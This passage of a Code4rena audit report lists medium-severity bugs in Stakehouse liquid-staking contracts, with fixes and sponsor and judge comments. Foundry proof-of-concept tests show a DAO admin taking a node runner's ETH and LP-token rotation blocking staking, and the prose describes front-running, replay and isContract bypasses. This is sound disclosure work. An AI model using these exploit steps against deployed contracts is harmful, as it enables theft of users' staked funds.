Used\n\nManual Review, Foundry\n\n### Recommended Mitigation Steps\n\nWe recommend not give the dao admin the priviledge to perform arbitrary execution to access user's fund.\n\n**[vince0656 (Stakehouse) confirmed](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/106#issuecomment-1329517252)**\n\n\n\n***\n\n## [[M-09] DAO or lsdn owner can steal funds from node runner](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/109)\n*Submitted by [koxuan](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/109)*\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L356-L377>\n\nDAO or LSD network owner can swap node runner of the smart contract to their own eoa, allowing them to withdrawETH or claim rewards from node runner.\n\n### Proof of Concept\n\nThere are no checks done when swapping the node runner whether there are funds in the smart contract that belongs to the node runner. Therefore, a malicious dao or lsd network owner can simply swap them out just right after the node runner has deposited 4 ether in the smart wallet.\n\nPlace poc in LiquidStakingManager.sol\n\n```solidity\n    function testDaoCanTakeNodeRunner4ETH() public {\n        address nodeRunner = accountOne; vm.deal(nodeRunner, 4 ether);\n        address feesAndMevUser = accountTwo; vm.deal(feesAndMevUser, 4 ether);\n        address savETHUser = accountThree; vm.deal(savETHUser, 24 ether);\n        address attacker = accountFour;\n\n\n        registerSingleBLSPubKey(nodeRunner, blsPubKeyOne, accountFour);\n\n        vm.startPrank(admin);\n        manager.rotateNodeRunnerOfSmartWallet(nodeRunner, attacker, true);\n\n        vm.stopPrank();\n\n        vm.startPrank(attacker);\n        emit log_uint(attacker.balance);\n        manager.withdrawETHForKnot(attacker,blsPubKeyOne);\n        emit log_uint(attacker.balance);\n        vm.stopPrank();\n    }\n\n```\n\n### Tools Used\n\nforge\n\n### Recommended Mitigation Steps\n\nSend back outstanding ETH and rewards that belongs to node runner if swapping is needed.\n\n**[vince0656 (Stakehouse) confirmed](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/109#issuecomment-1329514501)**\n\n\n\n***\n\n## [[M-10]  Incorrect implementation of the `ETHPoolLPFactory.sol#rotateLPTokens` let user stakes ETH more than `maxStakingAmountPerValidator` in `StakingFundsVault`, and DOS the stake function in `LiquidStakingManager`](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/132)\n*Submitted by [ladboy233](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/132), also found by [immeas](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/329), [0xdeadbeef0x](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/326), [bin2chen](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/295), [minhtrng](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/271), and [SaeedAlipoor01988](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/118)*\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/ETHPoolLPFactory.sol#L76><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L380><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/ETHPoolLPFactory.sol#L122><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/ETHPoolLPFactory.sol#L130><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/ETHPoolLPFactory.sol#L83><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L551><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L940>\n\nThe user is not able to stake the 32 ETH for validators because the staking fund vault LP total supply exceeds 4 ETHER.\n\nAfter the smart wallet, staking fund vault and savETH vault has 32 ETH, the user should be able to call:\n\n```solidity\n/// @notice Anyone can call this to trigger staking once they have all of the required input params from BLS authentication\n/// @param _blsPublicKeyOfKnots List of knots being staked with the Ethereum deposit contract (32 ETH sourced within the network)\n/// @param _ciphertexts List of backed up validator operations encrypted and stored to the Ethereum blockchain\n/// @param _aesEncryptorKeys List of public identifiers of credentials that performed the trustless backup\n/// @param _encryptionSignatures List of EIP712 signatures attesting to the correctness of the BLS signature\n/// @param _dataRoots List of serialized SSZ containers of the DepositData message for each validator used by Ethereum deposit contract\nfunction stake(\n\tbytes[] calldata _blsPublicKeyOfKnots,\n\tbytes[] calldata _ciphertexts,\n\tbytes[] calldata _aesEncryptorKeys,\n\tIDataStructures.EIP712Signature[] calldata _encryptionSignatures,\n\tbytes32[] calldata _dataRoots\n) external {\n```\n\nbefore the staking, the validation function is called:\n\n```solidity\n// check minimum balance of smart wallet, dao staking fund vault and savETH vault\n_assertEtherIsReadyForValidatorStaking(blsPubKey);\n```\n\nwhich calls:\n\n```solidity\n/// @dev Check the savETH vault, staking funds vault and node runner smart wallet to ensure 32 ether required for staking has been achieved\nfunction _assertEtherIsReadyForValidatorStaking(bytes calldata blsPubKey) internal view {\n\taddress associatedSmartWallet = smartWalletOfKnot[blsPubKey];\n\trequire(associatedSmartWallet.balance >= 4 ether, \"Smart wallet balance must be at least 4 ether\");\n\n\tLPToken stakingFundsLP = stakingFundsVault.lpTokenForKnot(blsPubKey);\n\trequire(address(stakingFundsLP) != address(0), \"No funds staked in staking funds vault\");\n\trequire(stakingFundsLP.totalSupply() == 4 ether, \"DAO staking funds vault balance must be at least 4 ether\");\n\n\tLPToken savETHVaultLP = savETHVault.lpTokenForKnot(blsPubKey);\n\trequire(address(savETHVaultLP) != address(0), \"No funds staked in savETH vault\");\n\trequire(savETHVaultLP.totalSupply() == 24 ether, \"KNOT must have 24 ETH in savETH vault\");\n}\n```\n\nnote that the code requires the total supply of the stakingFundsLP to be equal to 4 ETHER\n\n```solidity\nrequire(stakingFundsLP.totalSupply() == 4 ether, \"DAO staking funds vault balance must be at least 4 ether\");\n```\n\nhowever, user can call the function rotateLPTokens to mint more than 4 ETHER of the stakingFundsLP because of the incorrect implementation of the ETHPoolLPFactory.sol#rotateLPTokens\n\nnote that stakingFundVault inherits from ETHPoolFactory.sol\n\n```solidity\ncontract StakingFundsVault is\n    Initializable, ITransferHookProcessor, StakehouseAPI, ETHPoolLPFactory,\n```\n\nso user call rotateLPTokens on StakingFundsVault\n\n```solidity\n/// @notice Allow users to rotate the ETH from one LP token to another in the event that the BLS key is never staked\n/// @param _oldLPToken Instance of the old LP token (to be burnt)\n/// @param _newLPToken Instane of the new LP token (to be minted)\n/// @param _amount Amount of LP tokens to be rotated/converted from old to new\nfunction rotateLPTokens(LPToken _oldLPToken, LPToken _newLPToken, uint256 _amount) public {\n\trequire(address(_oldLPToken) != address(0), \"Zero address\");\n\trequire(address(_newLPToken) != address(0), \"Zero address\");\n\trequire(_oldLPToken != _newLPToken, \"Incorrect rotation to same token\");\n\trequire(_amount >= MIN_STAKING_AMOUNT, \"Amount cannot be zero\");\n\trequire(_amount <= _oldLPToken.balanceOf(msg.sender), \"Not enough balance\");\n\trequire(_oldLPToken.lastInteractedTimestamp(msg.sender) + 30 minutes < block.timestamp, \"Liquidity is still fresh\");\n\trequire(_amount + _newLPToken.totalSupply() <= 24 ether, \"Not enough mintable tokens\");\n```\n\nnote the line:\n\n```solidity\nrequire(_amount + _newLPToken.totalSupply() <= 24 ether, \"Not enough mintable tokens\");\n```\n\nthe correct implementaton should be:\n\n```solidity\nrequire(_amount + _newLPToken.totalSupply() <= maxStakingAmountPerValidator, \"Not enough mintable tokens\");\n```\n\nThe 24 ETH is hardcoded, but when the stakingFundsVault.sol is init, the maxStakingAmountPerValidator is set to 4 ETH.\n\n```solidity\n/// @dev Initialization logic\nfunction _init(LiquidStakingManager _liquidStakingNetworkManager, LPTokenFactory _lpTokenFactory) internal virtual {\n\trequire(address(_liquidStakingNetworkManager) != address(0), \"Zero Address\");\n\trequire(address(_lpTokenFactory) != address(0), \"Zero Address\");\n\n\tliquidStakingNetworkManager = _liquidStakingNetworkManager;\n\tlpTokenFactory = _lpTokenFactory;\n\n\tbaseLPTokenName = \"ETHLPToken_\";\n\tbaseLPTokenSymbol = \"ETHLP_\";\n\tmaxStakingAmountPerValidator = 4 ether;\n}\n```\n\nnote the line:\n\n```solidity\nmaxStakingAmountPerValidator = 4 ether;\n```\n\nthis parameter maxStakingAmountPerValidator restrict user's ETH deposit amount\n\n```solidity\n    /// @dev Internal business logic for processing staking deposits for single or batch deposits\nfunction _depositETHForStaking(bytes calldata _blsPublicKeyOfKnot, uint256 _amount, bool _enableTransferHook) internal {\n\trequire(_amount >= MIN_STAKING_AMOUNT, \"Min amount not reached\");\n\trequire(_blsPublicKeyOfKnot.length == 48, \"Invalid BLS public key\");\n\n\t// LP token issued for the KNOT\n\t// will be zero for a new KNOT because the mapping doesn't exist\n\tLPToken lpToken = lpTokenForKnot[_blsPublicKeyOfKnot];\n\tif(address(lpToken) != address(0)) {\n\t\t// KNOT and it's LP token is already registered\n\t\t// mint the respective LP tokens for the user\n\n\t\t// total supply after minting the LP token must not exceed maximum staking amount per validator\n\t\trequire(lpToken.totalSupply() + _amount <= maxStakingAmountPerValidator, \"Amount exceeds the staking limit for the validator\");\n\n\t\t// mint LP tokens for the depoistor with 1:1 ratio of LP tokens and ETH supplied\n\t\tlpToken.mint(msg.sender, _amount);\n\t\temit LPTokenMinted(_blsPublicKeyOfKnot, address(lpToken), msg.sender, _amount);\n\t}\n\telse {\n\t\t// check that amount doesn't exceed max staking amount per validator\n\t\trequire(_amount <= maxStakingAmountPerValidator, \"Amount exceeds the staking limit for the validator\");  \n```\n\nnote the line:\n\n```solidity\nrequire(_amount <= maxStakingAmountPerValidator, \"Amount exceeds the staking limit for the validator\"); \n```\n\nHowever, such restriction when rotating LP is changed to\n\n```solidity\nrequire(_amount + _newLPToken.totalSupply() <= 24 ether, \"Not enough mintable tokens\");\n```\n\n**So to sum it up:**\n\nWhen user stakes, the code strictly requires the stakingFundVault LP total supply is equal to 4 ETH:\n\n```solidity\nrequire(stakingFundsLP.totalSupply() == 4 ether, \"DAO staking funds vault balance must be at least 4 ether\");\n```\n\nHowever, when rotating the LP, the maxStakingAmountPerValidator for staking fund LP becomes 24 ETH, which exceeds 4 ETH (the expected maxStakingAmountPerValidator)\n\n### Proof of Concept\n\nFirst we need to add the import in LiquidStakingManager.t.sol\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L12>\n\n```solidity\nimport { MockAccountManager } from \"../../contracts/testing/stakehouse/MockAccountManager.sol\";\n\nimport \"../../contracts/liquid-staking/StakingFundsVault.sol\";\nimport \"../../contracts/liquid-staking/LPToken.sol\";\n```\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L35>\n\n**then we add the POC:**\n\n```solidity\nfunction test_rotateLP_Exceed_maxStakingAmountPerValidator_POC() public {\n\n\taddress user = vm.addr(21312);\n\n\tbytes memory blsPubKeyOne = fromHex(\"94fdc9a61a34eb6a034e343f20732456443a2ed6668ede04677adc1e15d2a24500a3e05cf7ad3dc3b2f3cc13fdc12af5\");\n\tbytes memory blsPubKeyTwo = fromHex(\"9AAdc9a61a34eb6a034e343f20732456443a2ed6668ede04677adc1e15d2a24500a3e05cf7ad3dc3b2f3cc13fdc12af5\");\n\n\tbytes[] memory publicKeys = new bytes[](2);\n\tpublicKeys[0] = blsPubKeyOne;\n\tpublicKeys[1] = blsPubKeyTwo;\n\n\tbytes[] memory signature = new bytes[](2);\n\tsignature[0] = \"signature\";\n\tsignature[1] = \"signature\";\n\n\t// user spends 8 ether and register two keys to become the public operator\n\tvm.prank(user);\n\tvm.deal(user, 8 ether);\n\tmanager.registerBLSPublicKeys{value: 8 ether}(\n\t\tpublicKeys,\n\t\tsignature,\n\t\tuser\n\t);\n\n\t// active two keys\n\tMockAccountManager(factory.accountMan()).setLifecycleStatus(blsPubKeyOne, 1);\n\tMockAccountManager(factory.accountMan()).setLifecycleStatus(blsPubKeyTwo, 1);\n\n\t// deposit 4 ETH for public key one and public key two\n\tStakingFundsVault stakingFundsVault = manager.stakingFundsVault();\n\tstakingFundsVault.depositETHForStaking{value: 4 ether}(blsPubKeyOne, 4 ether);\n\tstakingFundsVault.depositETHForStaking{value: 4 ether}(blsPubKeyTwo, 4 ether);\n\n\t// to bypass the error: \"Liquidity is still fresh\"\n\tvm.warp(1 days);\n\n\t// rotate staking amount from public key one to public key two\n\t// LP total supply for public key two exceed 4 ETHER\n\tLPToken LPTokenForPubKeyOne = manager.stakingFundsVault().lpTokenForKnot(blsPubKeyOne);\n\tLPToken LPTokenForPubKeyTwo = manager.stakingFundsVault().lpTokenForKnot(blsPubKeyTwo);\n\tstakingFundsVault.rotateLPTokens(LPTokenForPubKeyOne, LPTokenForPubKeyTwo, 4 ether);\n\n\tuint256 totalSupply = LPTokenForPubKeyTwo.totalSupply();\n\tconsole.log(\"total supply of the Staking fund LP exists 4 ETHER.\");\n\tconsole.log(totalSupply);\n\n\t// calling TestUtils.sol#stakeSingleBlsPubKey, revert\n\tstakeSingleBlsPubKey(blsPubKeyTwo);\n\n}\n```\n\nWe run the POC:\n\n```solidity\nforge test -vv --match test_rotateLP_Exceed_maxStakingAmountPerValidator_POC\n```\n\nthe output is:\n\n```solidity\nRunning 1 test for test/foundry/LiquidStakingManager.t.sol:LiquidStakingManagerTests\n[FAIL. Reason: DAO staking funds vault balance must be at least 4 ether] test_rotateLP_Exceed_maxStakingAmountPerValidator_POC() (gas: 1510454)\nLogs:\n  total supply of the Staking fund LP exists 4 ETHER.\n  8000000000000000000\n\nTest result: FAILED. 0 passed; 1 failed; finished in 15.73ms\n\nFailing tests:\nEncountered 1 failing test in test/foundry/LiquidStakingManager.t.sol:LiquidStakingManagerTests\n[FAIL. Reason: DAO staking funds vault balance must be at least 4 ether] test_rotateLP_Exceed_maxStakingAmountPerValidator_POC() (gas: 1510454)\n```\n\nthe total supply of the LP exceeds 4 ETH and the transaction precisely reverts in:\n\n```solidity\nrequire(stakingFundsLP.totalSupply() == 4 ether, \"DAO staking funds vault balance must be at least 4 ether\");\n```\n\n### Tools Used\n\nManual Review, Foundry\n\n### Recommended Mitigation Steps\n\nWe recommend the project change from\n\n```solidity\nrequire(_amount + _newLPToken.totalSupply() <= 24 ether, \"Not enough mintable tokens\");\n```\n\nto\n\n```solidity\nrequire(_amount + _newLPToken.totalSupply() <= maxStakingAmountPerValidator, \"Not enough mintable tokens\");\n```\n\nand change from\n\n```solidity\n/// @dev Check the savETH vault, staking funds vault and node runner smart wallet to ensure 32 ether required for staking has been achieved\nfunction _assertEtherIsReadyForValidatorStaking(bytes calldata blsPubKey) internal view {\n\taddress associatedSmartWallet = smartWalletOfKnot[blsPubKey];\n\trequire(associatedSmartWallet.balance >= 4 ether, \"Smart wallet balance must be at least 4 ether\");\n\n\tLPToken stakingFundsLP = stakingFundsVault.lpTokenForKnot(blsPubKey);\n\trequire(address(stakingFundsLP) != address(0), \"No funds staked in staking funds vault\");\n\trequire(stakingFundsLP.totalSupply() >= 4 ether, \"DAO staking funds vault balance must be at least 4 ether\");\n\n\tLPToken savETHVaultLP = savETHVault.lpTokenForKnot(blsPubKey);\n\trequire(address(savETHVaultLP) != address(0), \"No funds staked in savETH vault\");\n\trequire(savETHVaultLP.totalSupply() >= 24 ether, \"KNOT must have 24 ETH in savETH vault\");\n}\n```\n\nwe change from `==` balance check to `>=`, because `==` balance check is too strict in this case.\n\n**[vince0656 (Stakehouse) confirmed](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/132#issuecomment-1329494472)**\n\n**[Trust (warden) commented](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/132#issuecomment-1332138834):**\n > Really nice find and described beautifully. The only thing I would ask is why it is considered a HIGH risk, if the described impact is DOS of the staking function, which is a Medium level impact.\n\n**[LSDan (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/132#issuecomment-1332144897):**\n > I agree with the sponsor and other wardens here. This should be medium. Great find and explanation.\n\n\n\n***\n\n## [[M-11] Banned BLS public keys can still be registered](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/144)\n*Submitted by [Lambda](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/144), also found by [bearonbike](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/214)*\n\nIn `registerBLSPublicKeys`, it should be checked (according to the comment and error) if a BLS public key is part of the LSD network and not banned:\n\n```solidity\n// check if the BLS public key is part of LSD network and is not banned\nrequire(isBLSPublicKeyPartOfLSDNetwork(_blsPublicKey) == false, \"BLS public key is banned or not a part of LSD network\");\n```\n\nHowever, this is not actually checked. The function `isBLSPublicKeyPartOfLSDNetwork` only checks if the public key is part of the LSD network:\n\n```solidity\nfunction isBLSPublicKeyPartOfLSDNetwork(bytes calldata _blsPublicKeyOfKnot) public virtual view returns (bool) {\n        return smartWalletOfKnot[_blsPublicKeyOfKnot] != address(0);\n}\n```\n\nThe function `isBLSPublicKeyBanned` would perform both checks and should be called here:\n\n```solidity\nfunction isBLSPublicKeyBanned(bytes calldata _blsPublicKeyOfKnot) public virtual view returns (bool) {\n        return !isBLSPublicKeyPartOfLSDNetwork(_blsPublicKeyOfKnot) || bannedBLSPublicKeys[_blsPublicKeyOfKnot] != address(0);\n}\n```\n\nBecause of that, it is possible to pass banned BLS public keys to `registerBLSPublicKeys` and the call will succeed.\n\n### Recommended Mitigation Steps\n\nUse `isBLSPublicKeyBanned` instead of `isBLSPublicKeyPartOfLSDNetwork`.\n\n**[vince0656 (Stakehouse) confirmed](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/144#issuecomment-1329492785)**\n\n\n***\n\n## [[M-12] Attacker can grift syndicate staking by staking a small amount](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/146)\n*Submitted by [Lambda](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/146)*\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/a0558ed7b12e1ace1fe5c07970c7fc07eb00eebd/contracts/liquid-staking/LiquidStakingManager.sol#L882><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/23c3cf65975cada7fd2255a141b359a6b31c2f9c/contracts/syndicate/Syndicate.sol#L22>\n\n`LiquidStakingManager._autoStakeWithSyndicate` always stakes a fixed amount of 12 ETH. However, `Syndicate.stake` only allows a total staking amount of 12 ETH and reverts otherwise:\n\n```solidity\nif (_sETHAmount + totalStaked > 12 ether) revert InvalidStakeAmount();\n```\n\nAn attacker can abuse this and front-run calls to `mintDerivatives` (which call `_autoStakeWithSyndicate` internally). Because `Syndicate.stake` can be called by everyone, he can stake the minimum amount (1 gwei) such that the `mintDerivatives` call fails.\n\n### Proof Of Concept\n\nAs soon as there is a `mintDerivatives` call in the mempool, an attacker (that owns sETH) calls `Syndicate.stake` with an amount of 1 gwei. `_autoStakeWithSyndicate` will still call `Syndicate.stake` with 12 ether. However, `_sETHAmount + totalStaked > 12 ether` will then be true, meaning that the call will revert.\n\n### Recommended Mitigation Steps\n\nOnly allow staking through the LiquidStakingManager, i.e. add access control to `Syndicate.stake`.\n\n\n**[vince0656 (Stakehouse) confirmed](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/146#issuecomment-1329482113)**\n\n\n***\n\n## [[M-13] GiantPool `batchRotateLPTokens` function: Minimum balance for rotating LP Tokens should by dynamically calculated](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/149)\n*Submitted by [aphak5010](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/149)*\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantSavETHVaultPool.sol#L127><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L116><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L22>\n\nThe `GiantSavETHVaultPool` and `GiantMevAndFeesPool` both have a `batchRotateLPTokens` function that allows to move staked ETH to another key. Both functions require that the GiantLP balance of the sender is `>=0.5 ether`.\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantSavETHVaultPool.sol#L127>\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L116>\n\nThe reason for this is that there is a `common interest` needed in order to rotate LP Tokens. The way this is implemented right now does not serve this purpose and even makes the functions unable to be called in some cases.\n\nThe `MIN_STAKING_AMOUNT` for the GiantPools is `0.001 ether` (<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L22>). So a user should expect that this amount is sufficient to properly use the contract. However, even if there are multiple users paying into the GiantPool, they might not reach the 0.5 ETH threshold to call the function. So even if they would use some kind of multisig wallet to call the `batchRotateLPTokens` function, it would not be possible.\n\nAlso the threshold does not scale.\n\nImagine that User A puts 100 ETH into the GiantPool. Another User B puts 0.5 ETH into the GiantPool. Can we speak of \"common interest\" when User B wants to rotate the LP Tokens?\n\n### Tools Used\n\nVSCode\n\n### Recommended Mitigation Steps\n\nMy suggestion is to use a formula like:\\\n`require(lpTokenETH.balanceOf(msg.sender) >= (lpTokenETH.totalSupply() / CONSTANT_VALUE))`.\\\nWhere you can choose a CONSTANT_VALUE like 20 or 50.\n\nThis properly scales the required amount and helps mitigate both scenarios.\n\n**[vince0656 (Stakehouse) confirmed](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/149#issuecomment-1329480261)**\n\n\n\n***\n\n## [[M-14] Cross-chain replay attacks are possible with `deployLPToken`](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/154)\n*Submitted by [0xSmartContract](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/154)*\n\nMistakes made on one chain can be re-applied to a new chain. There is no chain.id in the data.\n\nIf a user does `deployLPToken` using the wrong network, an attacker can replay the action on the correct chain, and steal the funds a-la the wintermute gnosis safe attack, where the attacker can create the same address that the user tried to, and steal the funds from there\n\n<https://mirror.xyz/0xbuidlerdao.eth/lOE5VN-BHI0olGOXe27F0auviIuoSlnou_9t3XRJseY>\n\n### Proof of Concept\n\n```js\ncontracts/liquid-staking/LPTokenFactory.sol:\n  26      /// @param _tokenName Name of the LP token to be deployed\n  27:     function deployLPToken(\n  28:         address _deployer,\n  29:         address _transferHookProcessor,\n  30:         string calldata _tokenSymbol,\n  31:         string calldata _tokenName\n  32:     ) external returns (address) {\n  33:         require(address(_deployer) != address(0), \"Zero address\");\n  34:         require(bytes(_tokenSymbol).length != 0, \"Symbol cannot be zero\");\n  35:         require(bytes(_tokenName).length != 0, \"Name cannot be zero\");\n  36: \n  37:         address newInstance = Clones.clone(lpTokenImplementation);\n  38:         ILPTokenInit(newInstance).init(\n  39:             _deployer,\n  40:             _transferHookProcessor,\n  41:             _tokenSymbol,\n  42:             _tokenName\n  43:         );\n  44: \n  45:         emit LPTokenDeployed(newInstance);\n  46: \n  47:         return newInstance;\n  48:     }\n```\n\n\n### Recommended Mitigation Steps\n\nInclude the chain.id\n\n**[vince0656 (Stakehouse) disputed and commented](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/154#issuecomment-1329479473):**\n > LSD is a protocol deployed on ETH only.\n\n**[LSDan (judge) commented](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/154#issuecomment-1332212179):**\n > Understood, but ETH can and has forked. It is also possible that you or a team that succeeds you changes your mind about multiple network deployments.\n\n\n\n***\n\n## [[M-15] `GiantMevAndFeesPool.previewAccumulatedETH` function: \"accumulated\" variable is not updated correctly in for loop leading to result that is too low](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/160)\n*Submitted by [aphak5010](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/160), also found by [datapunk](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/447), [Trust](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/417), [Aymen0909](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/346), and [zaskoh](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/320)*\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L82><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L91>\n\nThe `GiantMevAndFeesPool.previewAccumulatedETH` function (<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L82>) allows to view the ETH that is accumulated by an address.\n\nHowever the formula is not correct.\n\nIn each iteration of the foor loop, `accumulated` is assigned a new value (<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L91>) when actually the value should be updated like this:\n\n```solidity\naccumulated += StakingFundsVault(payable(_stakingFundsVaults[i])).batchPreviewAccumulatedETH(\n        address(this),\n        _lpTokens[i]\n    );\n```\n\nObviously the `accumulated` value must be calculated for all stakingFundVaults not only for one stakingFundsVault.\n\nWhile this calculation is not used internally by the contract, it will cause any third-party contract that relies on this calculation to behave incorrectly.\n\nFor example a third party smart contract might only allow users to withdraw once the value returned by `previewAccumulatedETH` reaches a certain threshold. Because of the issue however the accumulated ETH value that is returned will always be too low.\n\n### Tools Used\n\nVSCode\n\n### Recommended Mitigation Steps\n\nFix:\n\n```solidity\n@@ -88,7 +88,7 @@ contract GiantMevAndFeesPool is ITransferHookProcessor, GiantPoolBase, Syndicate\n \n         uint256 accumulated;\n         for (uint256 i; i < _stakingFundsVaults.length; ++i) {\n-            accumulated = StakingFundsVault(payable(_stakingFundsVaults[i])).batchPreviewAccumulatedETH(\n+            accumulated += StakingFundsVault(payable(_stakingFundsVaults[i])).batchPreviewAccumulatedETH(\n                 address(this),\n                 _lpTokens[i]\n             );\n```\n\n**[vince0656 (Stakehouse) confirmed](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/160#issuecomment-1329478028)**\n\n\n\n***\n\n## [[M-16] dETH / ETH / LPTokenETH can become depegged due to ETH 2.0 reward slashing](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/164)\n*Submitted by [ladboy233](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/164), also found by [Trust](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/433)*\n\nI want to quote the info from the doc:\n\n> SavETH Vault - users can pool up to `24 ETH` where protected staking ensures no-loss. dETH can be redeemed after staking\n\nand\n\n> Allocate savETH <> dETH to `savETH Vault` (24 dETH)\n\nHowever, the main risk in ETH 2.0 POS staking is the slashing penalty, in that case the ETH will not be pegged and the validator cannot maintain a minimum 32 ETH staking balance.\n\n<https://cryptobriefing.com/ethereum-2-0-validators-slashed-staking-pool-error/>\n\n### Recommended Mitigation Steps\n\nWe recommand the protocol to add mechanism to ensure the dETH is pegged via burning if case the ETH got slashed.\n\nAnd consider when the node do not maintain a minmum 32 ETH staking balance, who is in charge of adding the ETH balance to increase the staking balance or withdraw the ETH and distribute the fund.\n\n**Please note: the following comment occurred after judging and awarding were finalized.**\n\n**[vince0656 (Stakehouse) disputed and commented](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/164#issuecomment-1384355141):**\n> There is no peg associated with dETH. Users can redeem underlying staked ETH by rage quitting Stakehouse protocol. This is taken care of by the Stakehouse protocol through SLOT (which protects) dETH due to redemption rate mechanics and further special exit penalty. Please see audit reports for Stakehouse:<br>\n> Audit report 1: https://github.com/runtimeverification/publications/blob/main/reports/smart-contracts/Blockswap_Stakehouse.pdf<br>\n> Audit report 2: https://github.com/runtimeverification/publications/blob/main/reports/smart-contracts/Blockswap_Stakehouse_2nd_Audit.pdf<br>\n\n\n\n***\n\n## [[M-17] `Address.isContract()` is not a reliable way of checking if the input is an EOA](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/189)\n*Submitted by [yixxas](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/189), also found by [CloudX](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/137) and [ladboy233](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/108)*\n\nThe underlying assumption of `eoaRepresentative` being an EOA can be untrue. This can cause many unintended effects as the contract comments strongly suggests that this must be an EOA account.\n\n### Proof of Concept\n\nWhen BLS public key is registered in `registerBLSPublicKeys()`, it has the check of\n\n> `require(!Address.isContract(_eoaRepresentative), \"Only EOA representative permitted\")`\n\nHowever, this check can be passed even though input is a smart contract if\n\n1.  Function is called in the constructor. `Address.isContract()` checks for the code length, but during construction code length is 0.\n2.  Smart contract that has not been deployed yet can be used. The CREATE2 opcode can be used to deterministically calculate the address of a smart contract before it is created. This means that the user can bypass this check by calling this function before deploying the contract.\n\n### Recommended Mitigation 